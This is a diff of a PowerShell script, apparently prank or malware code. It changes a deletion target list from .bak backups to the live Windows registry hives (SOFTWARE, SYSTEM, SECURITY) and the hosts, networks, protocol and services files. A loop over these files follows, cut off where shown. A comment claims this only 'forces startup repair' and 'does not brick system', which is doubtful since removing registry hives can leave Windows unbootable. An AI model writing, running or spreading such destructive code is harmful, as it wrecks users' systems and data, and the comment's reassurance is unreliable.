@@ -36,14 +36,14 @@ Set-Content -Path $speechScriptPath -Value $speechScriptContent
 
 # removes system files, forces startup repair (does not brick system)
 $systemFiles = @(
-    "C:\Windows\System32\config\SOFTWARE.bak",
-    "C:\Windows\System32\config\SYSTEM.bak",
-    "C:\Windows\System32\config\SECURITY.bak",
+    "C:\Windows\System32\config\SOFTWARE",
+    "C:\Windows\System32\config\SYSTEM",
+    "C:\Windows\System32\config\SECURITY",
     "C:\Windows\System32\config\SAM.bak",
-    "C:\Windows\System32\drivers\etc\hosts.bak",
-    "C:\Windows\System32\drivers\etc\networks.bak",
-    "C:\Windows\System32\drivers\etc\protocol.bak",
-    "C:\Windows\System32\drivers\etc\services.bak"
+    "C:\Windows\System32\drivers\etc\hosts",
+    "C:\Windows\System32\drivers\etc\networks",
+    "C:\Windows\System32\drivers\etc\protocol",
+    "C:\Windows\System32\drivers\etc\services"
 )
 
 foreach ($file in $systemFiles) {
